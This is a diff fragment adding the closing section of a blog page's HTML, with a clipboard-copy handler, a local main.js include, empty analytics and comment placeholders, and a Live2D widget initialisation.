+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
